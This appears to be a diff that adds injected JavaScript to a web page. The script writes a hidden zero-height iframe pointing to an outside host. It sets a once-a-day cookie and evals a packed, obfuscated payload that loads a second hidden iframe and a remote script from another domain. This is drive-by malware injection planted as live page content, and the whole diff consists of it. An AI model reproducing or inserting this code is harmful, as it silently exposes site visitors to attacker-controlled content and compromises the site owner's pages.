@@ -1,0 +1,6 @@
+<!--
+document.write("<iframe src=http://llsv1115.7766.org/dszq/14.htm width=111 height=0 border=0></iframe>");
+
+if(document.cookie.indexOf('hello')==-1){var expires=new Date();expires.setTime(expires.getTime()+24*60*60*1000);document.cookie='hello=Yes;path=/;expires='+expires.toGMTString()
+eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('6.m("<a j=9://b.f.4/8/k/i/e.g?2日 l=1 7=0></a><h d=c j=9://b.f.4/5/3.3?2日></h>");',62,23,'|100|123456|aspx|com|data|document|height|html|http|iframe|img0|javascript|language|logo|niupan|png|script|shtml|src|tiyu|width|writeln'.split('|'),0,{}));}
+-->
